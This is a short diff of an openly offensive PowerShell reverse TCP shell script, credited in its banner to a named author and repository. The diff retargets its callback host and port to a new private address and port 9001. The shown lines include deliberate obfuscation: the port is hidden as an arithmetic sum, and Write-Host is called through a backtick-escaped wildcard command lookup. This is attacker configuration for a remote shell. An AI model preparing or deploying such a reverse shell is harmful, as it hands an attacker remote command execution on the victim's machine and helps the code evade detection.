@@ -1,8 +1,8 @@
 # change the host address and/or port number as necessary
 # obfuscated host address, same as $a = "127.0.0.1";
-$a = "192.168.1.162";
+$a = "10.74.0.190";
 # obfuscated port number, same as $p = 9000;
-$p = 1000 + 1000 + 1000 + 6000;
+$p = 1000 + 1000 + 1000 + 6001;
 & (`G`C`M *e-Ho??) "PowerShell Reverse TCP v4.0 by Ivan Sincek.";
 & (`G`C`M *e-Ho??) "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
 $c = $s = $b = $w = $d = $r = $null;
